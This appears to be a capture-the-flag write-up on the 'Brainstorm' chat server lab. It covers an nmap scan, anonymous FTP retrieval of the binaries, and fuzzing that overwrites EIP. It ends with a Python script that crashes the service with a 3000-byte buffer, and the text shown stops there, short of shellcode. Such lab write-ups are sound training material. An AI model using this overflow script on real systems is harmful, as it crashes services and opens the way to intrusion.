> BrainStorm

# Nmap

nmap -sC -sV -T4 -Pn -vv -A -oN nmap/initial $IP

```
21/tcp   open  ftp                syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  ssl/ms-wbt-server? syn-ack
9999/tcp open  abyss?             syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
```

We got FTP open and we can login anonymously and we got 2 files `chatserver.exe` and `essfunc.dll`.

**Note: Change to binary mode using `binary` before downloading from ftp**

We can connect to port 9999 using nc. And it is the chat server we are working with.

There are 2 paramters where we can search for buffer overflow. 

`Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters):`

And 

```
Write a message:
```

`python3 -c 'print "A" * 3000'`

So let's start with username. Hmm, didn't work. So let's go with message and we are stuck and connection is reset by peer.
Looking at Immunity Debbugger we can see that we have overwritten the EIP with `\x41\x41\x41\x41` that is `AAAA`.

# Boilerplate Code

```
import socket,sys

address = '10.10.201.170'
port = 9999

uname = "sam"

buffer = "A" * 3000

try:
		print '[+] Sending Buffer'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((address,port))
		s.recv(1024)
		s.send(uname + '\r\n')
		s.recv(1024)
		s.send(buffer + '\r\n')
		s.recv(1024)
except:
		print '[!] unable to connect to application'
		sys.exit(0)
finally:
		s.close()
```

